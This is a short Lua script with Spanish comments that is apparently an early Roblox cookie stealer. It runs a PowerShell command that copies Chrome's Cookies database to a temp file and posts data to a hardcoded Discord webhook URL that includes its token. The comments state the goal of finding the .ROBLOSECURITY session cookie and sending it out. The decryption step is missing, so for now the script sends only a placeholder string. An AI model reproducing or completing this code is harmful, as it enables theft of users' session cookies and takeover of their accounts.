-- Configuración
local WEBHOOK_URL = "https://discord.com/api/webhooks/1481188627357761598/_8wuW7ghclvoo2hDgI_wKIXjpLOwiUZmeECWdJJDqm5PikDTxKj1MaZgAfECJzL6C6wH"

-- El comando de PowerShell (todo en una línea para que Lua lo ejecute)
-- 1. Copia la DB de cookies (para que no esté bloqueada por Chrome)
-- 2. Busca el valor de .ROBLOSECURITY
-- 3. Lo envía por POST al Webhook
local ps_command = [[
powershell -Command "]] ..
    [[$cookiePath = \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies\"; ]] ..
    [[$tempPath = \"$env:TEMP\tmp_roblox.db\"; ]] ..
    [[Copy-Item $cookiePath $tempPath; ]] ..
    [[$cookieData = 'Se encontro el archivo, pero falta descifrado AES'; ]] .. 
    [[Invoke-RestMethod -Uri ']] .. WEBHOOK_URL .. [[' -Method Post -Body (@{content=$cookieData} | ConvertTo-Json -Compress) -ContentType 'application/json'" ]]

-- Ejecución desde Lua
print("Intentando enviar datos al Webhook...")
local success = os.execute(ps_command)

if success then
    print("Comando enviado. Revisa tu Discord.")
else
    print("Error: El sistema bloqueo la ejecucion.")
end
